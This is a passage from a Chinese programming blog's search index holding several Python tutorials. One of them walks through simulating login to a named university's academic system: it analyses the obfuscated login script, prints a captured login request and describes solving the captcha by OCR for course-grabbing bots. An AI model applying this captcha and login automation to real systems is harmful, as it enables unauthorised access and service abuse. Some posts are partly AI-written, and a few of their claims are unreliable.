total += i  # 【4】累加合法的数值    return total# 测试代码for i in range(3):    try:        data = list(map(int, input(&quot;输入整数用逗号隔开: &quot;).split(&quot;,&quot;)))        print(&quot;总计=&quot;, total(data))  # 【5】调用total函数计算和    except NumberError as e:  # 【6】捕获自定义异常        print(e)\n\n实验总结\nPython 异常处理 try except else 的执行流程：\n\ntry 块：包含可能产生异常的代码\nexcept 块：当 try 块中发生异常时执行，可以捕获特定类型的异常\nelse 块：当 try 块中没有发生异常时执行\nfinally 块：无论是否发生异常都会执行的代码块\n\n执行顺序：\n\n正常情况：try → else → finally\n异常情况：try → except → finally\n\n\n自定义异常如何抛出：\n\n通过创建继承自 Exception 类的自定义类来定义异常\n\n使用 raise 关键字抛出异常\n\n示例：\nclass MyError(Exception):    passraise MyError(&quot;这是一个自定义错误&quot;)\n\n\n实验中的问题总结：\n\n异常处理可以让程序更加健壮，避免因异常而崩溃\n合理使用 try-except 可以优雅地处理错误情况\n自定义异常可以更好地表达程序特定的错误情况\n注意捕获具体的异常类型，避免使用过于宽泛的 except 语句\n\n\n\n","categories":["Python"],"tags":["Python"]},{"title":"Python开发学习记录","url":"/posts/f30b492.html","content":"前言本文持续记录 Python 学习中遇到的一些小知识点，难题等内容，包括但不仅限于 Python 开发、Python 爬虫、JSON、Web 等内容\n本文包含部分 AI 补充的内容\n学习记录2025 年 2 月 8 日 JSON\n抓包过程中发现了 JSON 的 data 键数据用数组包裹，但某些格式化工具无法解析\n\ndata 被放在数组中主要是为了处理数据的可扩展性和一致性。这种设计有几个原因：\n\n可扩展性：\n\n如果以后接口需要返回多条数据（例如，多个课程），把 data 放在数组中可以确保数据结构的一致性。无论是返回单条数据还是多条数据，格式都能统一。\n\n例如，如果返回课程列表时，\ndata\n\n 就可以包含多个课程的对象：\n&#123;  &quot;code&quot;: 0,  &quot;data&quot;: [    &#123; ...课程1... &#125;,    &#123; ...课程2... &#125;,    &#123; ...课程3... &#125;  ],  &quot;message&quot;: &quot;ok&quot;&#125;\n\n\n避免特殊情况：\n\n如果直接将 data 设为对象而不是数组，返回单条数据时就必须特殊处理，导致前端和后端的处理逻辑变得复杂。通过统一使用数组，即使只有一条数据，也能确保一致性，处理起来更简单。\n\n\n符合 RESTful API 设计规范：\n\n在 RESTful 风格的 API 中，通常会使用数组来表示资源集合，即使只有一个资源，仍然放入数组中。这样做能够清晰表明数据是集合的一部分，符合数据结构的语义。\n\n\n\n总结来说，data 使用数组包裹是为了保持接口的结构一致性和灵活性，尤其是在处理多条数据时。\n","categories":["Python"],"tags":["Python","开发"]},{"title":"Python异步编程实战：群聊验证系统的并发处理","url":"/posts/8687e59f.html","content":"Python 异步编程实战：群聊验证系统的并发处理\n本文含有 AI 搜索生成内容，仅供参考\n\n本文以 https://github.com/W1ndys/W1ndysBot-dev/tree/main/app/modules/GroupHumanVerification 为示例，实现一个群聊验证系统。\n引言在开发机器人或自动化系统时，我们经常需要处理多个群聊的并发操作。本文将介绍如何使用 Python 的异步编程特性来实现高效的群聊验证系统。\n1. 异步编程基础1.1 什么是异步编程？异步编程是一种编程范式，允许程序在等待 I&#x2F;O 操作（如网络请求）时执行其他任务，而不是被阻塞。在 Python 中，我们使用async/await语法来实现异步编程。\nasync def example():    # 异步操作    await some_async_operation()\n\n1.2 协程（Coroutine）协程是异步编程的基本单位，它可以在执行过程中暂停和恢复。与线程相比，协程更轻量级，更适合处理 I&#x2F;O 密集型任务。\n2. 实现群聊验证系统2.1 基本结构class GroupHumanVerificationHandler:    async def handle_scan_verification(self):        try:            with DataManager() as dm:                unverified_users = dm.get_all_unverified_users_with_code_and_warning()                result_msgs = []                if unverified_users:                    tasks = []                    for group_id, user_list in unverified_users.items():                        task = asyncio.create_task(                            self._process_single_group(group_id, user_list, dm, result_msgs)                        )                        tasks.append(task)                    await asyncio.gather(*tasks)\n\n2.2 并发处理单个群async def _process_single_group(self, group_id, user_list, dm, result_msgs):    try:        # 发送扫描提示        await send_private_msg(...)        await asyncio.sleep(0.05)  # 释放控制权        # 处理用户验证        for user_id, warning_count, code in user_list:            # 处理逻辑            await asyncio.sleep(0.05)\n\n3. 关键概念解析3.1 事件循环（Event Loop）事件循环是异步编程的核心，它负责调度和执行协程。当协程遇到await时，会释放控制权给事件循环，允许其他协程执行。\n3.2 并发 vs 并行\n并发：多个任务交替执行\n并行：多个任务同时执行\n\n在 Python 中，由于 GIL（全局解释器锁）的存在，我们主要实现并发而不是并行。\n3.3 共享资源处理result_msgs = []  # 共享的结果列表\n\n多个协程共享资源时，需要确保线程安全。在这个例子中，列表的append操作是原子的，所以是安全的。\n4. 性能优化4.1 I&#x2F;O 操作优化# 这些操作都是I/O密集型的await send_private_msg(...)  # 发送消息await send_group_msg(...)    # 发送群消息await set_group_kick(...)    # 踢人操作\n\n通过异步处理，这些 I&#x2F;O 操作不会阻塞其他任务。\n4.2 控制权释放await asyncio.sleep(0.05)  # 释放控制权\n\n适当的控制权释放可以确保系统响应性。\n5. 错误处理try:    # 并发操作except Exception as e:    logger.error(f&quot;[&#123;MODULE_NAME&#125;]处理扫描入群验证失败: &#123;e&#125;&quot;)\n\n每个协程都有自己的错误处理，确保一个协程的错误不会影响其他协程。\n6. 最佳实践\n合理使用asyncio.sleep()释放控制权\n确保共享资源的线程安全\n适当的错误处理\n避免 CPU 密集型操作阻塞事件循环\n\n7. 总结通过使用 Python 的异步编程特性，我们可以实现高效的群聊验证系统。主要优势包括：\n\n提高 I&#x2F;O 密集型操作的效率\n避免单个群处理阻塞其他群的处理\n保持代码的可读性和可维护性\n合理利用系统资源\n\n8. 注意事项\n异步编程主要适用于 I&#x2F;O 密集型操作\n对于 CPU 密集型操作，考虑使用多进程\n注意内存使用，避免创建过多协程\n合理设置超时和重试机制\n\n9. 扩展阅读\nPython asyncio 官方文档\nPython 异步编程最佳实践\n\n希望这篇教程能帮助你理解 Python 异步编程在群聊验证系统中的应用。如果你有任何问题，欢迎在评论区讨论！\n","categories":["Python"],"tags":["Python","异步编程","并发处理"]},{"title":"Python爬虫、自动化脚本与QQ机器人","url":"/posts/f6c10002.html","content":"安全声明重要： 本课程内容仅限于学习、研究和技术交流目的，在 授权或公开 的网络资源上进行测试。\n\n请勿 对未授权的网站或系统进行爬取或自动化操作。\n请勿 将所学技术用于任何非法用途或商业牟利。\n请遵守 目标网站的 robots.txt 协议和用户协议。\n合理控制 请求频率，避免对目标服务器造成过大负担。（DDoS 攻击）\n\n任何滥用技术导致的法律责任或后果，均由使用者自行承担。\n\n引言：我们今天要探讨什么？\nPython 爬虫 (Web Crawler&#x2F;Spider): 自动获取网络信息的“数据矿工”。\n自动化脚本 (Automation Script&#x2F;Bot): 模拟人类操作的“智能助手”。\n它们之间的联系与区别。\n为什么 Python 是实现这些功能的有力工具？\n\n\n什么是 Python 爬虫？\n定义: 使用 Python 编程语言编写的、用于 自动、系统性地 从互联网上 获取（抓取） 网页信息的程序或脚本。\n\n想象一下“网络蜘蛛”（Spider）在“万维网”（Web）上按照一定规则爬行，收集信息。\n\n\n主要目的:\n\n数据采集: 如市场价格、新闻资讯、用户评论等。\n信息整合: 如聚合内容、制作索引（搜索引擎核心）。\n数据分析: 为后续的数据分析、挖掘提供原始数据。\n\n\n为什么用 Python?\n\n语法简洁，易于上手: 开发效率高。\n强大的第三方库生态:\nrequests: 方便地发送 HTTP 网络请求。\nBeautifulSoup, lxml: 高效地解析 HTML&#x2F;XML 文档，提取数据。\nScrapy: 强大的异步爬虫框架，适合大型项目。\n\n\n活跃的社区: 容易找到学习资源和解决方案。\n\n\n\n\n什么是自动化脚本？\n定义: 使用编程语言（如 Python）编写的，用于 模拟人类用户 与计算机系统（尤其是 Web 界面）进行交互，以 自动完成特定、重复性任务 的程序。\n\n主要目的:\n\n任务自动化: 替代手动执行繁琐、耗时的操作。\n效率提升: 例如，在特定时间点快速完成抢课、抢票、签到等。\n流程执行: 自动登录、填写表单、点击按钮、提交数据等。\n\n\n与爬虫的联系:\n\n通常也需要与 Web 服务器进行交互（发送请求、接收响应）。\n可能使用与爬虫相同的库（如 requests, Selenium）。\nSelenium 这类浏览器自动化工具在复杂交互脚本中尤其常用。\n\n\n\n\n爬虫 vs. 自动化脚本：核心区别\n\n\n特性\nPython 爬虫\n自动化脚本 (Bot)\n\n\n\n核心目标\n数据获取 (Information Retrieval)\n任务执行 (Task Execution)\n\n\n主要操作\n读取网页内容 (Read)\n模拟用户交互 (Interact&#x2F;Write)\n\n\n范围\n通常较广，可能遍历多个页面&#x2F;网站\n通常较窄，针对特定流程&#x2F;任务\n\n\n侧重点\n高效下载、解析、存储数据\n精确模拟操作、处理登录状态、提交数据\n\n\n简单来说：爬虫侧重于“看”和“存”，自动化脚本侧重于“做”和“交互”。\nPython 爬虫案例演示由于之前学期大家都选修了 Python 课程，期末大作业就是爬虫作业，这里不过多解释\nPython 自动化脚本案例演示——以学校某系统为例核心知识点涉及的关键知识点：\n\nHTTP 基础:\n理解 GET 和 POST 请求的区别。\n了解请求头 (Headers)、Cookies、表单数据 (Form Data) 的作用。\n\n\n浏览器开发者工具 (F12):\n元素审查 (Inspect Element): 定位 HTML 元素，获取其 ID, Name, Class, XPath, CSS Selector 等定位符。\n网络分析 (Network Tab): 查看实际的网络请求过程（URL, 请求方法, Headers, Payload, 响应内容），分析登录、提交等关键操作的请求细节。\n\n\n核心 Python 库:\nrequests 库:\n发送 GET&#x2F;POST 请求 (requests.get, requests.post)。\n管理会话 (requests.Session) 以保持登录状态 (自动处理 Cookies)。\n定制请求头 (Headers)。\n提交表单数据。\n\n\nSelenium 库 (用于复杂交互或 JavaScript 渲染页面):\nWebDriver 的安装与配置 (如 ChromeDriver)。\n启动和控制浏览器 (webdriver.Chrome())。\n定位页面元素 (find_element)。\n模拟用户操作 (输入 send_keys, 点击 click, 选择下拉框等)。\n处理页面等待 (implicitly_wait, WebDriverWait, expected_conditions)。\n执行 JavaScript 脚本 (execute_script)。\n\n\n\n\nHTML&#x2F;XML 解析 (可选，若需从页面提取信息):\nBeautifulSoup 或 lxml: 解析 requests 获取的 HTML 内容，或 Selenium 获取的 page_source，提取状态信息或下一步操作所需数据。\n\n\n登录与认证处理:\n分析登录请求 (通常是 POST 请求)。\n构造登录所需的表单数据。\n处理验证码 (简单的图形验证码可尝试 OCR 库如 ddddocr，复杂的交互式验证码是难点)。\n\n\n模拟操作流程:\n根据手动操作步骤，将每一步转化为代码实现 (访问特定 URL、填写表单、点击按钮)。\n处理页面跳转和导航逻辑。\n\n\n异常处理:\n使用 try...except 语句处理网络错误、元素找不到、登录失败等异常情况，增强脚本健壮性。\n\n\n配置与参数化:\n将用户名、密码、目标 URL 等信息存储在配置文件或变量中，而不是硬编码在代码里。\n\n\n频率控制与道德规范:\n使用 time.sleep() 添加适当延时，避免对服务器造成过大压力。\n再次强调遵守学校系统使用规定。\n\n\n\n案例 1——教务处公告监控以 通知（旧）-曲阜师范大学教务处 为例\n要想监控教务处公告，首先进入到教务处公告页面\n\n打开 F12 元素审查，可以定位到公告的主体元素\n\n接下来就有思路了，我们可以每隔一段时间，运行脚本，获取并保存这部分元素的内容，当检测到获取的内容和保存的内容有变化，这时候就说明教务处有新内容了\n借助 requests 库，我们可以很方便地发送 HTTP 请求，获取网页内容，然后使用 BeautifulSoup 库解析网页内容，提取出公告的主体元素\n\n\n监控已经有了，如何实现提醒呢，可以接入飞书机器人、钉钉机器人、QQ 机器人等主动推送\n\n案例 2——教务系统模拟登录以 http://zhjw.qfnu.edu.cn/jsxsd 地址为例\n为什么要强调一下这个地址呢，因为教务系统写的很乱，jsxsd 这个路径有没有，直接影响验证码路径地址，直接影响登录请求\n\n通过分析可得，登录按钮点击会触发一个 onclick 事件，按钮会调用一个 login 函数，表单会触发一个 onsubmit 事件，事件会调用一个 submitForm1 函数\n\n实测发现 login 这个函数不重要，他可能是与 submitForm1 协同工作的，我们只需要关注 submitForm1 函数\n下面分析 submitForm1 函数\n\n这段代码主要做了以下几件事：\n\n获取用户名和密码\n如果用户名和密码为空，则弹出提示框，并返回 false\n如果用户名和密码不为空，则将用户名和密码进行编码，编码方式为 encodeInp 函数\n将编码后的用户名和密码存储到 encoded 元素中\n将 encoded 元素的值存储到 jzmmid 元素中\n清空密码框的值\n如果 LoginToXkLdap 不等于 logonLdap，则清空用户名和密码框的值\n返回 true\n\n经过搜索找到了 encoded，但是代码被混淆了，反混淆之后就是一个 base64 编码，其实很简单，不反混淆也可以通过下面的抓包猜出来\n\n原始请求包：\nPOST /jsxsd/xk/LoginToXkLdap HTTP/1.1Host: zhjw.qfnu.edu.cnContent-Length: 98Cache-Control: max-age=0Origin: http://zhjw.qfnu.edu.cnContent-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://zhjw.qfnu.edu.cn/jsxsd/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; sto-id-20480=XXXXXXXXXXXX; JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXuserAccount=&amp;userPassword=&amp;RANDOMCODE=xxxx&amp;encoded=XXXXXXXXXX%3D%3D%25%25%25XXXXXXXXXX%3D\n\n\n经过分析得到，userAccount 和 userPassword 是用户名和密码，RANDOMCODE 是验证码，encoded 是经过编码的用户名和密码\n验证码可以通过 ddddocr 库识别，识别之后，将验证码和用户名和密码 base64 编码拼接，就可以模拟请求发送给服务器了\n\n模拟登录成功之后，就可以获取到教务系统的数据了，比如课表、成绩、个人信息等，自动抢课等都是可以实现的\n这个系统的代码写的很乱，一个就是一开始那个验证码的路径写了两个地方不统一，另一个就是 API 接口以及变量命名很乱，没有可读性，截取一部分代码给大家看看\n\n\n案例 3——基于教务系统接入 QQ 机器人查询无课教室由于智慧曲园的无课教室查询只有曲阜老校区，并且智慧曲园时不时还崩掉，天天进教务系统看还很麻烦，于是自己写一个接入到 QQ 里\n核心思路就是利用查到的有课教室，然后从所有教室里排除有课的教室，剩下的就是无课的教室\n模拟登录（案例 2 已经演示完成）查询有课教室通过抓包得到请求包的内容以及返回内容\n\n\n可以看到返回内容是一套 HTML，通过 BeautifulSoup 解析之后，可以得到教室列表\n接入 QQ 机器人接入 QQ 机器人之后就可以查无课教室了，对考研党很友好\n并且我对搜索逻辑进行了优化，支持指定天数，范围节次\n\n","categories":["Python"],"tags":["Python","爬虫","自动化","QQ机器人"]},{"title":"Python的函数传参规则","url":"/posts/de3b9b4c.html","content":"1. 核心传递机制\n按对象引用传递\n传递对象的引用（非拷贝）\n可变对象（列表&#x2F;字典）在函数内修改会影响原对象\n不可变对象（数字&#x2F;字符串）修改会创建新对象\n\n\n\ndef modify(obj):    obj.append(1) if isinstance(obj, list) else print(&quot;不可变对象&quot;)lst = [0]modify(lst)  # lst变为[0, 1]\n\n2. 参数匹配规则两种传递方式\n\n\n方式\n匹配规则\n示例\n\n\n\n位置参数\n严格按定义顺序匹配\nfunc(1, 2) → a&#x3D;1, b&#x3D;2\n\n\n关键字参数\n按参数名匹配（顺序无关）\nfunc(b=2, a=1) → a&#x3D;1, b&#x3D;2\n\n\n关键特性\n变量名是否相同不影响参数传递\n混合使用时：位置参数必须在前\n\nfunc(1, b=2)  # 合法func(a=1, 2)  # SyntaxError\n\n3. 参数类型总结四种参数类型\n位置参数def func(a, b): pass\n默认参数def func(a=1, b=2): pass\n可变位置参数 (*args)def func(*args):  # 接收为元组\n可变关键字参数 (**kwargs)def func(**kwargs):  # 接收为字典\n\n4. 易混淆场景解析场景 1：顺序影响def demo(a, b):    print(f&quot;a=&#123;a&#125;, b=&#123;b&#125;&quot;)x, y = 10, 20demo(y, x)  # 输出: a=20, b=10（纯位置传递）\n\n场景 2：关键字参数无视顺序demo(b=y, a=x)  # 输出: a=10, b=20\n\n场景 3：默认参数陷阱# 默认参数在定义时求值（仅一次）def buggy(lst=[]):    lst.append(1)    return lstbuggy()  # 返回 [1]buggy()  # 返回 [1, 1] （非预期！）\n\n5. 最佳实践\n超过 3 个参数时建议使用关键字参数\n避免可变对象作为默认参数\n参数命名要有明确含义\n复杂函数建议添加类型注解\n\ndef good_example(    user_id: int,    username: str,    *,    is_admin: bool = False,  # 强制关键字参数    **options) -&gt; dict: ...\n\n\n关键记忆点：Python 参数传递只关心调用方式（位置&#x2F;关键字），与变量名无关。明确传递方式比依赖顺序更可靠。\n\n","categories":["Python"],"tags":["Python"]},{"title":"Python学习日记","url":"/posts/7c404c2f.html","content":"\n水个蓝桥算了\n\nPython 算法学习记录变量和简单数据类型变量变量的命名和使用变量名只能包含字母、数字和下划线。变量名可以字母或下划线打头，但不能以数字打头，例如，可将变量命名为 message_1，但不能将其命名为 1_message\n变量名不能包含空格，但可使用下划线来分隔其中的单词。例如，变量名 greeting_message 可行，但变量名 greeting message 会引发错误。\n不要将 Python 关键字和函数名用作变量名，即不要使用 Python 保留用于特殊用途的单词，如 print（请参见附录 A.4）\n变量名应既简短又具有描述性。例如，name 比 n 好，student_name 比 s_n 好，name_length 比 length_of_persons_name 好\n慎用小写字母 l 和大写字母 O，因为它们可能被人错看成数字 1 和 0。\n\n注意 就目前而言，应使用小写的 Python 变量名。在变量名中使用大写字母虽然不会导致错误，但避免使用大写字母是个不错的主意\n使用变量时避免命名错误\n拼写错误\n….其他错误\n\n字符串字符串就是一系列字符。在 Python 中，用引号括起的都是字符串，其中的引号可以是单引号，也可以是双引号\n\n“This is a string.”‘This is also a string.’ \n\n这种灵活性让你能够在字符串中包含引号和撇号：\n\n‘I told my friend, “Python is my favorite language!”‘“The language ‘Python’ is named after Monty Python, not the snake.”“ One of Python’s strengths is its diverse and supportive community.\n\n下面是一些字符串的使用方式\n使用方法修改字符串的大小写name.py \nname = &quot;ada lovelace&quot; print(name.title())\n\n\n将这个文件保存为 name.py，再运行它。你将看到如下输出：Ada Lovelace \n\n title()是对句子进行首字母大写，其他字母小写的函数 ，适合处理姓名等的数据类型。\n在 name.title()中，name 后面的句点（.）让 Python 对变量 name 执行方法 title()指定的操作。\n每个方法后面都跟着一对括号，这是因为方法通常需要额外的信息来完成其工作。这种信息是在括号内提供的。函数 title()不需要额外的信息，因此它后面的括号是空的。\n还有 upper()和 lower()分别是全大写和全小写的函数\n测试代码\nname = &quot;hELLo wOrld&quot;print(&quot;原始字符串：&quot;)print(name)print(&quot;首字母大写字符串：&quot;)print(name.title())print(&quot;全大写字符串：&quot;)print(name.upper())print(&quot;全小写字符串：&quot;)print(name.lower())\n\n合并（拼接）字符串first_name = &quot;ada&quot; last_name = &quot;lovelace&quot; full_name = first_name + &quot; &quot; + last_nameprint(full_name)\n\nPython 使用加号（+）来合并字符串。在这个示例中，我们使用+来合并 first_name、空格和 last_name，以得到完整的姓名，其结果如下：\nada lovelace \n这种合并字符串的方法称为拼接。通过拼接，可使用存储在变量中的信息来创建完整的消息\n可以结合上一步的三个函数进行字符处理。\n使用制表符或换行符来添加空白在编程中，空白泛指 任何非打印字符，如空格、制表符和换行符。你可使用空白来组织输出，以使其更易读。\n\\t 缩进 \\n 换行\n删除空白lstrip()删除开头的空白   rstrip()可以删除末尾的空白\n使用字符串时避免语法错误这边是注意引号，若字符串必须包括单引号，就用双引号引这个字符串\n数字整数Python中整数可以直接进行加减乘除乘方的计算\nPython还支持运算次序，因此你可在同一个表达式中使用多种运算。你还可以使用括号来修\n\n停更了\n","categories":["Python"],"tags":["Python"]},{"title":"Python类之间的变量访问与操作","url":"/posts/f007d414.html","content":"\n  \n    本文含有 LLM 辅助，请谨慎参考。\n\n  \n\nPython 类之间的变量访问与操作详解在面向对象编程中，类是组织代码的重要方式，但很多初学者对于类之间如何共享和访问变量感到困惑。本文将详细解析 Python 类的变量访问机制，以及不同类之间如何实现数据共享与操作。\n类函数与普通函数的区别类函数的基本概念类函数（也称为方法）与普通函数有着本质的区别，主要体现在数据的存储和访问方式上。\n类函数（方法）的特点\n有”记忆”能力：实例变量会一直保存在内存中\n共享数据：同一个实例的所有方法可以访问相同的实例变量\n不必重复传参：只需要通过 self 就能访问实例的所有属性\n\n普通函数的特点\n无状态：函数执行完毕后变量就会被销毁\n需要显式传参：每次调用都需要提供所有必要的参数\n数据隔离：不同函数间的数据需要通过参数和返回值传递\n\n形象比喻**类实例就像一个”工具箱”**：\n\n工具箱里放着各种工具（实例属性）\n工具箱有不同的使用方法（实例方法）\n所有的方法都可以拿到工具箱里的任何工具\n\n**普通函数像是”独立工人”**：\n\n每次工作都需要给他所有必要的工具\n工作完成后会把工具还回去\n下次再做同样的工作还需要重新给他工具\n\n代码对比使用类的方式：class TextAnalyzer:    def __init__(self, word_manager):        # 存储word_manager作为实例属性        self.word_manager = word_manager    def analyze_text(self, text, group_id, threshold):        # 可以直接使用self.word_manager，不需要再传递        words_dict = self.word_manager.get_merged_words(group_id)        # ...分析文本        return total_score, risk_level, triggered_words\n\n如果使用普通函数：def analyze_text(word_manager, text, group_id, threshold):    # 每次调用都需要传入word_manager    words_dict = word_manager.get_merged_words(group_id)    # ...分析文本    return total_score, risk_level, triggered_words\n\nself 的访问范围很多人误解 self 可以访问任何类的变量，实际上 self 只能访问”自己的”变量。\n正确理解\n每个类实例只能通过 self 访问自己的属性\nself.属性名 只能访问当前实例的属性\n不同类之间不共享变量空间\n类之间的数据共享需要显式建立联系\n将一个类的实例作为另一个类的属性\n通过参数传递实例\n\n\n\n实际例子# WordManager类class WordManager:    def __init__(self, data_dir):        self.data_dir = data_dir        self.global_words = &#123;&#125; # 只属于WordManager实例的属性    def get_merged_words(self, group_id):        # 只能访问自己的属性        return self.global_words.copy()# TextAnalyzer类class TextAnalyzer:    def __init__(self, word_manager):        # 保存WordManager实例作为自己的属性        self.word_manager = word_manager # 建立关联    def analyze_text(self, text, group_id, threshold):        # 可以访问word_manager的方法和属性        words_dict = self.word_manager.get_merged_words(group_id)        # ...但不能直接访问WordManager内部的属性        # 例如：self.global_words 是不可访问的\n\n如何从一个类访问另一个类的变量下面介绍几种在不同类之间共享和操作变量的方法：\n1. 依赖注入（推荐方法）这是最常用、最灵活的方法，通过构造函数传递依赖关系。\n# 定义两个类class 数据类:    def __init__(self):        self.内部数据 = &quot;重要数据&quot;    def 获取数据(self):        return self.内部数据    def 设置数据(self, 新数据):        self.内部数据 = 新数据class 操作类:    def __init__(self, 数据实例):        # 保存另一个类的实例作为属性        self.数据 = 数据实例    def 处理(self):        # 1. 读取另一个类的数据        当前数据 = self.数据.获取数据()        # 2. 修改另一个类的数据        处理后数据 = 当前数据 + &quot;已处理&quot;        self.数据.设置数据(处理后数据)# 使用方式数据实例 = 数据类()操作实例 = 操作类(数据实例) # 注入依赖操作实例.处理() # 处理数据\n\n优点：\n\n代码解耦，易于测试\n依赖关系明确\n灵活性高\n\n2. 通过访问器方法通过公共方法访问和修改另一个类的数据。\nclass A类:    def __init__(self):        self.私有数据 = 100    # 提供访问方法    def 获取数据(self):        return self.私有数据    def 设置数据(self, 值):        self.私有数据 = 值class B类:    def __init__(self, a实例):        self.a = a实例    def 操作(self):        # 通过方法访问和修改        当前值 = self.a.获取数据()        self.a.设置数据(当前值 + 50)\n\n优点：\n\n保持封装性\n可以添加验证逻辑\n接口稳定\n\n3. 通过返回值传递通过方法返回值在类之间传递数据。\nclass 生成器:    def __init__(self):        self.内部计数 = 0    def 生成数据(self):        self.内部计数 += 1        return f&quot;数据-&#123;self.内部计数&#125;&quot;class 处理器:    def 处理数据(self, 生成器实例):        # 获取数据并处理        数据 = 生成器实例.生成数据()        return f&quot;处理结果: &#123;数据&#125;&quot;\n\n优点：\n\n简单直接\n无需保存引用\n适合一次性操作\n\n4. 使用全局实例（不太推荐）通过全局变量共享实例。\n# 全局实例全局数据管理器 = Noneclass 数据管理器:    def __init__(self):        self.共享数据 = &#123;&#125;    def 设置(self, 键, 值):        self.共享数据[键] = 值    def 获取(self, 键):        return self.共享数据.get(键)class 使用者:    def 操作(self):        global 全局数据管理器        # 使用全局实例        全局数据管理器.设置(&quot;计数&quot;, 5)# 初始化def 初始化系统():    global 全局数据管理器    全局数据管理器 = 数据管理器()\n\n缺点：\n\n全局状态难以测试\n依赖关系不明确\n可能导致意外修改\n\n5. 通过继承关系（适用于特定场景）通过继承共享基类的属性和方法。\nclass 基础类:    def __init__(self):        self.共享数据 = &quot;基础数据&quot;    def 基础方法(self):        return self.共享数据class 扩展类(基础类):    def __init__(self):        super().__init__() # 调用父类初始化        self.扩展数据 = &quot;扩展数据&quot;    def 扩展方法(self):        # 可以直接访问继承的属性        return f&quot;&#123;self.共享数据&#125; + &#123;self.扩展数据&#125;&quot;\n\n适用场景：\n\n真正的”是一个”关系\n需要复用大量代码\n有明确的层次结构\n\n最佳实践总结\n首选依赖注入：灵活、解耦、易测试\n使用公共接口：而不是直接访问属性\n避免使用全局变量：会导致代码难以测试和维护\n继承用于”是一个”关系：不要仅为共享数据而继承\n保持封装性：通过方法而非直接访问属性\n\n结语理解类之间的变量访问和操作是掌握面向对象编程的关键。通过选择合适的方式在类之间共享数据，可以使代码更加模块化、可维护和可测试。依赖注入作为最推荐的方式，不仅提供了灵活性，还保持了良好的代码结构和测试性。\n希望本文能帮助你更好地理解 Python 类之间的变量访问机制，编写出更优雅的面向对象代码。\n","categories":["编程技术"],"tags":["Python","面向对象编程","类","变量访问"]},{"title":"Python蓝桥杯常用函数以及问题","url":"/posts/7bb4fcd.html","content":"\n摘自 https://blog.csdn.net/m0_46204224/article/details/109049999#/\n\nPython 常用函数input 函数单行输入data = list(map(int,input().split()))#输入不定量的以空格分隔的连续输入\n\nm,n = map(int,intput().split())#输入定量的以空格分隔的连续输入\n\n注意：若间隔号不是空格，而是其他符号，只需要在 split(“”)中定义间隔号即可，例如\ndata = list(map(int,input().split(&quot;-&quot;)))m,n = map(int,intput().split(&quot;-&quot;))#用-分割\n\n多行输入一个 input 输入一个数字，列表，每次每行只能输入一个数字\ndata1 = [int(input()) for _ in range(2)]# 一个 input 输入一个数字，列表，每次每行只能输入一个数字print(data1)# [1,2]\n\n一个 input 输入一串数字，列表的列表\ndata2 = [list(map(int, input().split())) for _ in range(2)]# 一个 input 输入一串数字，列表的列表print(data2)# [[1], [15]]\n\n有选择的保存数据\nlist3 = []list4 = []for i in range(2):    m, n = map(int, input().split())    if m &gt; 0:        list3.append(m)    else:        list4.append(n)print(list3)print(list4)# 有选择的保存数据# 这段代码的作用是从用户输入中获取两组数字对，并根据每对数字的第一个数字是正数还是非正数（包括负数和零），将其分别存储到两个不同的列表中。最后，打印出这两个列表中的内容。\n\n各种输入\ninput() 返回的是字符串类型 (str)\n一次输入多个值就用 list(input().split())\n根据需求加 map，即 map(int,input.split())\n每出现一个 input() 就代表了一行，加了 map 就代表是变量多接受输入\n\n例如：\na = input()  # 接受一个值a, b = input().split()  # 接受两个值，空格输入，回车执行c = input().split()  # 输入为列表\n\n\n举例合集\n\nm = int(input())  # 输入一个数字m, n = map(int, input().split())  # 输入两个数字a, b = map(int, input().split(&quot;#&quot;))  # 连续输入，井号间隔str1 = list(map(int, input().split()))  # 一行输入无限多的整型数据，用 list 存储data3 = [int(input()) for _ in range(10)]  # 多行 input 输入，存放在一个列表中data4 = [    list(map(int, input().split())) for i in range(2)]  # 相同的思想生成列表，存储为列表的列表data5 = [tuple(map(int, input().split())) for i in range(2)]# 列表推导式for i in range(5):    x = input()    # 连续输入    arr = input().split()  # 这里存储的是字符串型的列表arr = list(map(int, input().split()))  # 这里存储的是整型的列表a = 2.345a = str(a)print(float(a[0:4]) + 1)  # 通过变成 str，不 4 舍 5 入，再 float 成数值print(&quot;%.2f&quot; % (float(a)))  # %.2f 直接 4 舍 5 入\n\n\n记录一下没见过的 tuple 函数的语法解释（元组）\n\n记录一下 map 函数的语法解释（迭代器）\n\n记录一下 Python 中的列表推导式\n\n\n占位符%占位符详解占位符主要用于填充格式问题，通过加入格式化字符串来控制输出的格式。在 Python 中，常见的占位符及其使用方式如下：\n\n%s: 字符串的占位符，可以使用 %s 或者 &#123;&#125; 进行替换。例如：&#39;&#123;:s&#125;&#39;.format(&#39;hello&#39;)。\n%d: 整数的占位符，可以使用 %d 或者 &#123;&#125; 进行替换。例如：&#39;&#123;:d&#125;&#39;.format(10)。\n%.2f: 浮点数的占位符，控制保留小数点后两位，四舍五入。例如：&#39;&#123;:.2f&#125;&#39;.format(3.14159)。\n%.2e: 科学计数法的浮点数占位符，控制保留小数点后两位，以科学计数法表示。例如：&#39;&#123;:.2e&#125;&#39;.format(1000)。\n%：百分号占位符，用于在字符串中表示百分比。例如：&#39;&#123;&#125;%&#39;.format(50)。\n\n常见用法示例：\nprint(&#x27;&#123;&#125; &#123;&#125;&#x27;.format(&#x27;Hello&#x27;, &#x27;World&#x27;))  # 输出：Hello Worldprint(&#x27;The value is %d&#x27; % 42)  # 输出：The value is 42print(&#x27;The value is &#123;:.2f&#125;&#x27;.format(3.14159))  # 输出：The value is 3.14\n\n填充格式问题：\n\n&#123;:#x&#125;: 控制输出十六进制格式，# 表示保留进制前缀。例如：&#39;&#123;:#x&#125;&#39;.format(18) 输出 &#39;0x12&#39;。\n&#123;:0&gt;5&#125;: 控制填充格式，在数字前填充指定字符，总长度为 5。例如：&#39;&#123;:0&gt;5&#125;&#39;.format(&#39;33&#39;) 输出 &#39;00033&#39;。\n\n总的来说，format() 